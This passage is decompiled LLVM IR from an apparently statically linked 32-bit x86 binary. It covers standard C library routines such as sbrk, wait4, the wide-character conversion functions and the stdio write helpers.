  uselistorder i32 %v6_8051303, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805131c, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8051325 = load i32, i32* @ebx, align 4
  %v0_8051329 = load i32, i32* @global_var_805b49c.163, align 4
  %v1_8051329 = icmp eq i32 %v0_8051329, 0
  %v1_8051334 = icmp eq i1 %v1_8051329, false
  br i1 %v1_8051334, label %dec_label_pc_8051347, label %dec_label_pc_8051336

dec_label_pc_8051336:                             ; preds = %entry
  %v1_805133b = call i32 @__GI_brk(i32 0)
  %v2_8051343 = icmp slt i32 %v1_805133b, 0
  br i1 %v2_8051343, label %dec_label_pc_8051369, label %dec_label_pc_8051336.dec_label_pc_8051347_crit_edge

dec_label_pc_8051336.dec_label_pc_8051347_crit_edge: ; preds = %dec_label_pc_8051336
  %v0_8051349.pre = load i32, i32* @global_var_805b49c.163, align 4
  br label %dec_label_pc_8051347

dec_label_pc_8051347:                             ; preds = %dec_label_pc_8051336.dec_label_pc_8051347_crit_edge, %entry
  %v0_8051357 = phi i32 [ %v0_8051349.pre, %dec_label_pc_8051336.dec_label_pc_8051347_crit_edge ], [ %v0_8051329, %entry ]
  %v1_8051347 = icmp eq i32 %arg1, 0
  %v1_805134e = icmp eq i1 %v1_8051347, false
  br i1 %v1_805134e, label %dec_label_pc_8051354, label %dec_label_pc_8051350

dec_label_pc_8051350:                             ; preds = %dec_label_pc_8051347
  br label %dec_label_pc_805136c

dec_label_pc_8051354:                             ; preds = %dec_label_pc_8051347
  store i32 %v0_8051357, i32* @ebx, align 4
  %v2_8051359 = add i32 %v0_8051357, %arg1
  %v1_805135d = call i32 @__GI_brk(i32 %v2_8051359)
  %v2_8051365 = icmp slt i32 %v1_805135d, 0
  %v1_8051367 = icmp eq i1 %v2_8051365, false
  br i1 %v1_8051367, label %dec_label_pc_8051354.dec_label_pc_805136c_crit_edge, label %dec_label_pc_8051369

dec_label_pc_8051354.dec_label_pc_805136c_crit_edge: ; preds = %dec_label_pc_8051354
  %v0_805136c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805136c

dec_label_pc_8051369:                             ; preds = %dec_label_pc_8051354, %dec_label_pc_8051336
  br label %dec_label_pc_805136c

dec_label_pc_805136c:                             ; preds = %dec_label_pc_8051354.dec_label_pc_805136c_crit_edge, %dec_label_pc_8051350, %dec_label_pc_8051369
  %v0_805136c = phi i32 [ %v0_805136c.pre, %dec_label_pc_8051354.dec_label_pc_805136c_crit_edge ], [ %v0_8051357, %dec_label_pc_8051350 ], [ -1, %dec_label_pc_8051369 ]
  %v2_805136e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805136e, i32* @edx, align 4
  store i32 %v0_8051325, i32* @ebx, align 4
  ret i32 %v0_805136c

; uselistorder directives
  uselistorder i32 %v0_8051357, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_805136c, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8051374 = load i32, i32* @edi, align 4
  %v0_8051375 = load i32, i32* @esi, align 4
  store i32 %v0_8051375, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_8051389 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8051391 = call i32 @wait4(i32 %v0_8051389, i32 %v0_8051375, i32 %v0_8051374, i32 %tmp5)
  store i32 %v0_8051389, i32* @ebx, align 4
  store i32 %v4_8051391, i32* %esi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_8051391, -4095
  br i1 %tmp10, label %dec_label_pc_80513a9, label %dec_label_pc_805139d

dec_label_pc_805139d:                             ; preds = %entry
  %v1_805139d = call i32 @__errno_location(i32 %v0_8051389)
  %v0_80513a2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80513a2 = sub i32 0, %v0_80513a2
  %v2_80513a4 = inttoptr i32 %v1_805139d to i32*
  store i32 %v1_80513a2, i32* %v2_80513a4, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80513a9

dec_label_pc_80513a9:                             ; preds = %entry, %dec_label_pc_805139d
  %v0_80513a9 = phi i32 [ %v4_8051391, %entry ], [ -1, %dec_label_pc_805139d ]
  %v2_80513ac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80513ac, i32* @esi, align 4
  store i32 %v0_8051374, i32* @edi, align 4
  ret i32 %v0_80513a9

; uselistorder directives
  uselistorder i32 %v4_8051391, { 1, 0, 2 }
  uselistorder i32 %v0_8051389, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 1, 0 }
  uselistorder label %dec_label_pc_80513a9, { 1, 0 }
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_80513bb = icmp eq i32 %tmp5, 0
  %v1_80513bd = icmp eq i1 %v1_80513bb, false
  br i1 %v1_80513bd, label %dec_label_pc_80513c5, label %dec_label_pc_80513bf

dec_label_pc_80513bf:                             ; preds = %entry
  %v2_80513bf = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_80513c5

dec_label_pc_80513c5:                             ; preds = %entry, %dec_label_pc_80513bf
  %v0_80513e1 = phi i32 [ %tmp5, %entry ], [ %v2_80513bf, %dec_label_pc_80513bf ]
  %v0_80513c9 = phi i32 [ %tmp4, %entry ], [ 0, %dec_label_pc_80513bf ]
  %v2_80513c5 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v0_80513c9, i32* %stack_var_-4, align 4
  store i32 %v2_80513c5, i32* %stack_var_-8, align 4
  %v2_80513dc = ptrtoint i32* %stack_var_-8 to i32
  %v5_80513e2 = inttoptr i32 %v0_80513e1 to i8*
  %v6_80513e2 = call i32 @__GI_wcsnrtombs(i8* %v5_80513e2, i32 %v2_80513dc, i32 1, i32 16, i32 %tmp)
  %v1_80513ea = icmp eq i32 %v6_80513e2, 0
  %v1_80513ec = icmp eq i1 %v1_80513ea, false
  br i1 %v1_80513ec, label %dec_label_pc_80513f0, label %dec_label_pc_80513ee

dec_label_pc_80513ee:                             ; preds = %dec_label_pc_80513c5
  %v1_80513ee = and i32 %v6_80513e2, -256
  %v2_80513ee = or i32 %v1_80513ee, 1
  br label %dec_label_pc_80513f0

dec_label_pc_80513f0:                             ; preds = %dec_label_pc_80513c5, %dec_label_pc_80513ee
  %v0_80513f3 = phi i32 [ %v6_80513e2, %dec_label_pc_80513c5 ], [ %v2_80513ee, %dec_label_pc_80513ee ]
  ret i32 %v0_80513f3

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_80513f0, { 1, 0 }
  uselistorder label %dec_label_pc_80513c5, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_8051409 = inttoptr i32 %tmp to i8*
  %v6_8051409 = call i32 @__GI_wcsnrtombs(i8* %v5_8051409, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_8051409
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8051417 = load i32, i32* @ebx, align 4
  %v4_805141b = ptrtoint i8* %arg1 to i32
  store i32 %v4_805141b, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  %v1_8051427 = icmp eq i8* %arg1, null
  br i1 %v1_8051427, label %dec_label_pc_805145b.thread, label %dec_label_pc_805142b

dec_label_pc_805142b:                             ; preds = %entry
  store i32 1, i32* %edi.global-to-local, align 4
  %v12_8051430 = icmp eq i32 %v4_805141b, %arg2
  %v1_8051432 = icmp eq i1 %v12_8051430, false
  br i1 %v1_8051432, label %dec_label_pc_805145b, label %dec_label_pc_8051455

dec_label_pc_805145b.thread:                      ; preds = %entry
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8051438 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051438, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051465

dec_label_pc_8051441:                             ; preds = %dec_label_pc_805146c
  %v1_8051441 = call i32 @__errno_location(i32 %v0_8051417)
  store i32 %v1_8051441, i32* %eax.global-to-local, align 4
  %v1_8051446 = inttoptr i32 %v1_8051441 to i32*
  store i32 84, i32* %v1_8051446, align 4
  br label %dec_label_pc_8051492

dec_label_pc_8051451:                             ; preds = %dec_label_pc_8051473
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_8051487.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051483

dec_label_pc_8051455:                             ; preds = %dec_label_pc_805142b
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8051457 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051457, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805145b

dec_label_pc_805145b:                             ; preds = %dec_label_pc_805142b, %dec_label_pc_8051455
  %v2_805147315 = phi i32 [ %v4_805141b, %dec_label_pc_805142b ], [ %v2_8051457, %dec_label_pc_8051455 ]
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %tmp33 = icmp ult i32 %arg4, %arg3
  br i1 %tmp33, label %dec_label_pc_8051463, label %dec_label_pc_8051465

dec_label_pc_8051463:                             ; preds = %dec_label_pc_805145b
  store i32 %arg4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051465

dec_label_pc_8051465:                             ; preds = %dec_label_pc_805145b.thread, %dec_label_pc_805145b, %dec_label_pc_8051463
  %v2_80514731532 = phi i32 [ %v2_805147315, %dec_label_pc_805145b ], [ %v2_805147315, %dec_label_pc_8051463 ], [ %v2_8051438, %dec_label_pc_805145b.thread ]
  %v0_8051468 = phi i32 [ %arg3, %dec_label_pc_805145b ], [ %arg4, %dec_label_pc_8051463 ], [ %arg3, %dec_label_pc_805145b.thread ]
  %v1_8051465 = inttoptr i32 %arg2 to i32*
  %v2_8051465 = load i32, i32* %v1_8051465, align 4
  store i32 %v2_8051465, i32* %esi.global-to-local, align 4
  store i32 %v0_8051468, i32* @ecx, align 4
  %v1_805147f3 = icmp eq i32 %v0_8051468, 0
  %v1_805148110 = icmp eq i1 %v1_805147f3, false
  br i1 %v1_805148110, label %dec_label_pc_805146c, label %dec_label_pc_8051483

dec_label_pc_805146c:                             ; preds = %dec_label_pc_8051465, %dec_label_pc_8051479
  %v2_8051473 = phi i32 [ %v2_805147c, %dec_label_pc_8051479 ], [ %v2_80514731532, %dec_label_pc_8051465 ]
  %v0_805146c = phi i32 [ %v1_8051479, %dec_label_pc_8051479 ], [ %v2_8051465, %dec_label_pc_8051465 ]
  %v1_805146c = inttoptr i32 %v0_805146c to i32*
  %v2_805146c = load i32, i32* %v1_805146c, align 4
  store i32 %v2_805146c, i32* %eax.global-to-local, align 4
  %v6_8051471 = icmp ugt i32 %v2_805146c, 127
  br i1 %v6_8051471, label %dec_label_pc_8051441, label %dec_label_pc_8051473

dec_label_pc_8051473:                             ; preds = %dec_label_pc_805146c
  %v1_8051473 = trunc i32 %v2_805146c to i8
  %v3_8051473 = inttoptr i32 %v2_8051473 to i8*
  store i8 %v1_8051473, i8* %v3_8051473, align 1
  %v0_8051475 = load i32, i32* %eax.global-to-local, align 4
  %v3_8051475 = trunc i32 %v0_8051475 to i8
  %v4_8051475 = icmp eq i8 %v3_8051475, 0
  br i1 %v4_8051475, label %dec_label_pc_8051451, label %dec_label_pc_8051479

dec_label_pc_8051479:                             ; preds = %dec_label_pc_8051473
  %v0_8051479 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051479 = add i32 %v0_8051479, 4
  store i32 %v1_8051479, i32* %esi.global-to-local, align 4
  %v0_805147c = load i32, i32* %edx.global-to-local, align 4
  %v1_805147c = load i32, i32* %edi.global-to-local, align 4
  %v2_805147c = add i32 %v1_805147c, %v0_805147c
  store i32 %v2_805147c, i32* %edx.global-to-local, align 4
  %v0_805147e = load i32, i32* @ecx, align 4
  %v1_805147e = add i32 %v0_805147e, -1
  %v8_805147e = icmp eq i32 %v1_805147e, 0
  store i32 %v1_805147e, i32* @ecx, align 4
  %v1_8051481 = icmp eq i1 %v8_805147e, false
  br i1 %v1_8051481, label %dec_label_pc_805146c, label %dec_label_pc_8051483

dec_label_pc_8051483:                             ; preds = %dec_label_pc_8051479, %dec_label_pc_8051465, %dec_label_pc_8051451
  %v0_805148b = phi i32 [ 0, %dec_label_pc_8051451 ], [ %v2_8051465, %dec_label_pc_8051465 ], [ %v1_8051479, %dec_label_pc_8051479 ]
  %v0_8051487 = phi i32 [ %v0_8051487.pre, %dec_label_pc_8051451 ], [ %v2_80514731532, %dec_label_pc_8051465 ], [ %v2_805147c, %dec_label_pc_8051479 ]
  %v2_8051483 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051483, i32* %eax.global-to-local, align 4
  %v12_8051487 = icmp eq i32 %v0_8051487, %v2_8051483
  br i1 %v12_8051487, label %dec_label_pc_805148e, label %dec_label_pc_805148b

dec_label_pc_805148b:                             ; preds = %dec_label_pc_8051483
  %v1_805148b = load i32, i32* %ebp.global-to-local, align 4
  %v2_805148b = inttoptr i32 %v1_805148b to i32*
  store i32 %v0_805148b, i32* %v2_805148b, align 4
  br label %dec_label_pc_805148e

dec_label_pc_805148e:                             ; preds = %dec_label_pc_8051483, %dec_label_pc_805148b
  %v0_805148e = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805148e, i32* %eax.global-to-local, align 4
  %v1_8051490 = load i32, i32* @ecx, align 4
  %v2_8051490 = sub i32 %v0_805148e, %v1_8051490
  br label %dec_label_pc_8051492

dec_label_pc_8051492:                             ; preds = %dec_label_pc_8051441, %dec_label_pc_805148e
  %storemerge1 = phi i32 [ %v2_8051490, %dec_label_pc_805148e ], [ -1, %dec_label_pc_8051441 ]
  store i32 %storemerge1, i32* %eax.global-to-local, align 4
  store i32 %v0_8051417, i32* @ebx, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v2_805147c, { 0, 2, 1 }
  uselistorder i32 %v1_8051479, { 0, 2, 1 }
  uselistorder i32 %v2_8051465, { 1, 0, 2 }
  uselistorder i32 %v0_8051468, { 1, 0 }
  uselistorder i32 %v2_80514731532, { 1, 0 }
  uselistorder i32 %v4_805141b, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %edi.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 6, 5, 7 }
  uselistorder i32 127, { 1, 0, 4, 2, 5, 3 }
  uselistorder i32 84, { 2, 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 1, 3, 4, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051492, { 1, 0 }
  uselistorder label %dec_label_pc_805148e, { 1, 0 }
  uselistorder label %dec_label_pc_805146c, { 1, 0 }
  uselistorder label %dec_label_pc_8051465, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805145b, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_805149d = load i32, i32* @edi, align 4
  %v0_805149f = load i32, i32* @ebx, align 4
  %v4_80514a3 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80514a3, i32* @edi, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_80514af4 = icmp eq i32 %arg3, 0
  br i1 %v1_80514af4, label %dec_label_pc_805150e, label %dec_label_pc_80514b4.lr.ph

dec_label_pc_80514b4.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_80514b4

dec_label_pc_80514b4:                             ; preds = %dec_label_pc_80514d3.dec_label_pc_80514b4_crit_edge, %dec_label_pc_80514b4.lr.ph
  %v0_80514c4 = phi i32 [ %v4_80514a3, %dec_label_pc_80514b4.lr.ph ], [ %v0_80514c4.pre, %dec_label_pc_80514d3.dec_label_pc_80514b4_crit_edge ]
  %v0_80514c3 = phi i32 [ %arg2, %dec_label_pc_80514b4.lr.ph ], [ %v2_80514d5, %dec_label_pc_80514d3.dec_label_pc_80514b4_crit_edge ]
  %v0_80514b6.in = phi i32 [ %arg3, %dec_label_pc_80514b4.lr.ph ], [ %v2_80514d3, %dec_label_pc_80514d3.dec_label_pc_80514b4_crit_edge ]
  %v0_80514b6 = icmp slt i32 %v0_80514b6.in, 0
  store i32 %v0_80514b6.in, i32* %ebp.global-to-local, align 4
  %v2_80514b6 = icmp eq i1 %v0_80514b6, false
  %storemerge = select i1 %v2_80514b6, i32 %v0_80514b6.in, i32 2147483647
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_80514c4 = add i32 %v0_80514c4, 4
  %v2_80514c4 = inttoptr i32 %v1_80514c4 to i32*
  %v3_80514c4 = load i32, i32* %v2_80514c4, align 4
  %tmp36 = inttoptr i32 %v0_80514c3 to i32*
  %v5_80514c7 = call i32 @__libc_write(i32 %v3_80514c4, i32* %tmp36, i32 %storemerge)
  store i32 %v5_80514c7, i32* %eax.global-to-local, align 4
  %v2_80514cf = icmp slt i32 %v5_80514c7, 0
  br i1 %v2_80514cf, label %dec_label_pc_80514d9, label %dec_label_pc_80514d3

dec_label_pc_80514d3:                             ; preds = %dec_label_pc_80514b4
  %v0_80514d3 = load i32, i32* @ebx, align 4
  %v2_80514d3 = sub i32 %v0_80514d3, %v5_80514c7
  %v12_80514d3 = icmp eq i32 %v2_80514d3, 0
  store i32 %v2_80514d3, i32* @ebx, align 4
  %v0_80514d5 = load i32, i32* %esi.global-to-local, align 4
  %v2_80514d5 = add i32 %v0_80514d5, %v5_80514c7
  store i32 %v2_80514d5, i32* %esi.global-to-local, align 4
  br i1 %v12_80514d3, label %dec_label_pc_805150e, label %dec_label_pc_80514d3.dec_label_pc_80514b4_crit_edge

dec_label_pc_80514d3.dec_label_pc_80514b4_crit_edge: ; preds = %dec_label_pc_80514d3
  %v0_80514c4.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80514b4

dec_label_pc_80514d9:                             ; preds = %dec_label_pc_80514b4
  %v0_80514d9 = load i32, i32* @edi, align 4
  %v1_80514d9 = add i32 %v0_80514d9, 8
  %v2_80514d9 = inttoptr i32 %v1_80514d9 to i32*
  %v3_80514d9 = load i32, i32* %v2_80514d9, align 4
  store i32 %v3_80514d9, i32* @edx, align 4
  %v1_80514dc = add i32 %v0_80514d9, 12
  %v2_80514dc = inttoptr i32 %v1_80514dc to i32*
  %v3_80514dc = load i32, i32* %v2_80514dc, align 4
  store i32 %v3_80514dc, i32* %eax.global-to-local, align 4
  %v1_80514df = inttoptr i32 %v0_80514d9 to i16*
  %v2_80514df = load i16, i16* %v1_80514df, align 2
  %v3_80514df = or i16 %v2_80514df, 8
  store i16 %v3_80514df, i16* %v1_80514df, align 2
  %v0_80514e3 = load i32, i32* %eax.global-to-local, align 4
  %v1_80514e3 = load i32, i32* @edx, align 4
  %v2_80514e3 = sub i32 %v0_80514e3, %v1_80514e3
  %v12_80514e3 = icmp eq i32 %v2_80514e3, 0
  store i32 %v2_80514e3, i32* %eax.global-to-local, align 4
  %v4_805150a.pre = load i32, i32* @ebx, align 4
  br i1 %v12_80514e3, label %dec_label_pc_805150a, label %dec_label_pc_80514e7

dec_label_pc_80514e7:                             ; preds = %dec_label_pc_80514d9
  %v6_80514e9 = icmp ugt i32 %v2_80514e3, %v4_805150a.pre
  br i1 %v6_80514e9, label %dec_label_pc_80514ed.preheader, label %dec_label_pc_80514eb

dec_label_pc_80514eb:                             ; preds = %dec_label_pc_80514e7
  store i32 %v2_80514e3, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80514ed.preheader

dec_label_pc_80514ed.preheader:                   ; preds = %dec_label_pc_80514eb, %dec_label_pc_80514e7
  %v0_80514ed.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80514ed

dec_label_pc_80514ed:                             ; preds = %dec_label_pc_80514ed.preheader, %dec_label_pc_80514ff
  %v2_80514ef = phi i32 [ %v1_80514e3, %dec_label_pc_80514ed.preheader ], [ %v1_80514fb, %dec_label_pc_80514ff ]
  %v4_80514ed = phi i32 [ %v2_80514e3, %dec_label_pc_80514ed.preheader ], [ %v0_80514f1, %dec_label_pc_80514ff ]
  %v0_80514ed = phi i32 [ %v0_80514ed.pre, %dec_label_pc_80514ed.preheader ], [ %v1_80514ff, %dec_label_pc_80514ff ]
  %v1_80514ed = inttoptr i32 %v0_80514ed to i8*
  %v2_80514ed = load i8, i8* %v1_80514ed, align 1
  %v3_80514ed = zext i8 %v2_80514ed to i32
  %v5_80514ed = and i32 %v4_80514ed, -256
  %v6_80514ed = or i32 %v3_80514ed, %v5_80514ed
  store i32 %v6_80514ed, i32* %eax.global-to-local, align 4
  %v3_80514ef = inttoptr i32 %v2_80514ef to i8*
  store i8 %v2_80514ed, i8* %v3_80514ef, align 1
  %v0_80514f1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80514f1 = trunc i32 %v0_80514f1 to i8
  %v10_80514f1 = icmp eq i8 %v1_80514f1, 10
  %v1_80514f3 = icmp eq i1 %v10_80514f1, false
  br i1 %v1_80514f3, label %dec_label_pc_80514fb, label %dec_label_pc_80514f5

dec_label_pc_80514f5:                             ; preds = %dec_label_pc_80514ed
  %v0_80514f5 = load i32, i32* @edi, align 4
  %v1_80514f5 = add i32 %v0_80514f5, 1
  %v2_80514f5 = inttoptr i32 %v1_80514f5 to i8*
  %v3_80514f5 = load i8, i8* %v2_80514f5, align 1
  %v4_80514f5 = urem i8 %v3_80514f5, 2
  %v5_80514f5 = icmp eq i8 %v4_80514f5, 0
  %v1_80514f9 = icmp eq i1 %v5_80514f5, false
  br i1 %v1_80514f9, label %dec_label_pc_80514f5.dec_label_pc_8051502_crit_edge, label %dec_label_pc_80514fb

dec_label_pc_80514f5.dec_label_pc_8051502_crit_edge: ; preds = %dec_label_pc_80514f5
  %v0_8051502.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051502

dec_label_pc_80514fb:                             ; preds = %dec_label_pc_80514f5, %dec_label_pc_80514ed
  %v0_80514fb = load i32, i32* @edx, align 4
  %v1_80514fb = add i32 %v0_80514fb, 1
  store i32 %v1_80514fb, i32* @edx, align 4
  %v0_80514fc = load i32, i32* %ebp.global-to-local, align 4
  %v1_80514fc = add i32 %v0_80514fc, -1
  %v8_80514fc = icmp eq i32 %v1_80514fc, 0
  store i32 %v1_80514fc, i32* %ebp.global-to-local, align 4
  br i1 %v8_80514fc, label %dec_label_pc_80514fb.dec_label_pc_8051502_crit_edge, label %dec_label_pc_80514ff

dec_label_pc_80514fb.dec_label_pc_8051502_crit_edge: ; preds = %dec_label_pc_80514fb
  %v1_8051502.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051502

dec_label_pc_80514ff:                             ; preds = %dec_label_pc_80514fb
  %v0_80514ff = load i32, i32* %esi.global-to-local, align 4
  %v1_80514ff = add i32 %v0_80514ff, 1
  store i32 %v1_80514ff, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80514ed

dec_label_pc_8051502:                             ; preds = %dec_label_pc_80514fb.dec_label_pc_8051502_crit_edge, %dec_label_pc_80514f5.dec_label_pc_8051502_crit_edge
  %v1_8051502 = phi i32 [ %v0_80514f5, %dec_label_pc_80514f5.dec_label_pc_8051502_crit_edge ], [ %v1_8051502.pre, %dec_label_pc_80514fb.dec_label_pc_8051502_crit_edge ]
  %v0_8051502 = phi i32 [ %v0_8051502.pre, %dec_label_pc_80514f5.dec_label_pc_8051502_crit_edge ], [ %v1_80514fb, %dec_label_pc_80514fb.dec_label_pc_8051502_crit_edge ]
  %v2_8051502 = add i32 %v1_8051502, 16
  %v3_8051502 = inttoptr i32 %v2_8051502 to i32*
  store i32 %v0_8051502, i32* %v3_8051502, align 4
  %v0_8051505 = load i32, i32* @edx, align 4
  %v1_8051505 = load i32, i32* @edi, align 4
  %v2_8051505 = add i32 %v1_8051505, 8
  %v3_8051505 = inttoptr i32 %v2_8051505 to i32*
  %v4_8051505 = load i32, i32* %v3_8051505, align 4
  %v5_8051505 = sub i32 %v0_8051505, %v4_8051505
  store i32 %v5_8051505, i32* @edx, align 4
  %v0_8051508 = load i32, i32* @ebx, align 4
  %v2_8051508 = sub i32 %v0_8051508, %v5_8051505
  br label %dec_label_pc_805150a

dec_label_pc_805150a:                             ; preds = %dec_label_pc_80514d9, %dec_label_pc_8051502
  %v4_805150a = phi i32 [ %v2_8051508, %dec_label_pc_8051502 ], [ %v4_805150a.pre, %dec_label_pc_80514d9 ]
  %v5_805150a = sub i32 %arg3, %v4_805150a
  br label %dec_label_pc_805150e

dec_label_pc_805150e:                             ; preds = %dec_label_pc_80514d3, %entry, %dec_label_pc_805150a
  %stack_var_12.0 = phi i32 [ %v5_805150a, %dec_label_pc_805150a ], [ 0, %entry ], [ %arg3, %dec_label_pc_80514d3 ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  store i32 %v0_805149f, i32* @ebx, align 4
  store i32 %v0_805149d, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_80514ff, { 1, 0 }
  uselistorder i32 %v1_80514fc, { 1, 0 }
  uselistorder i32 %v1_80514fb, { 0, 2, 1 }
  uselistorder i32 %v0_80514f1, { 1, 0 }
  uselistorder i32 %v2_80514d5, { 1, 0 }
  uselistorder i32 %v2_80514d3, { 1, 2, 0 }
  uselistorder i32 %v5_80514c7, { 0, 2, 1, 3 }
  uselistorder i32* %esi.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %ebp.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32*, i32)* @__libc_write, { 1, 0 }
  uselistorder i32 2147483647, { 1, 0, 2 }
  uselistorder i32 %arg3, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_805150e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805150a, { 1, 0 }
  uselistorder label %dec_label_pc_80514ed, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805151c = load i32, i32* @ebp, align 4
  %v0_805151d = load i32, i32* @edi, align 4
  %v0_805151e = load i32, i32* @esi, align 4
  %v0_805151f = load i32, i32* @ebx, align 4
  store i32 %v0_805151f, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_805152f = add i32 %arg3, 1
  %v2_805152f = inttoptr i32 %v1_805152f to i8*
  %v3_805152f = load i8, i8* %v2_805152f, align 1
  %v4_805152f = and i8 %v3_805152f, 2
  %v5_805152f = icmp eq i8 %v4_805152f, 0
  %v1_8051533 = icmp eq i1 %v5_805152f, false
  br i1 %v1_8051533, label %dec_label_pc_80515ea, label %dec_label_pc_8051539

dec_label_pc_8051539:                             ; preds = %entry
  %v1_8051539 = add i32 %arg3, 4
  %v2_8051539 = inttoptr i32 %v1_8051539 to i32*
  %v3_8051539 = load i32, i32* %v2_8051539, align 4
  %v13_8051539 = icmp eq i32 %v3_8051539, -2
  %v1_805153d = add i32 %arg3, 16
  %v2_805153d = inttoptr i32 %v1_805153d to i32*
  %v3_805153d = load i32, i32* %v2_805153d, align 4
  store i32 %v3_805153d, i32* @edx, align 4
  %v1_8051540 = add i32 %arg3, 12
  %v2_8051540 = inttoptr i32 %v1_8051540 to i32*
  %v3_8051540 = load i32, i32* %v2_8051540, align 4
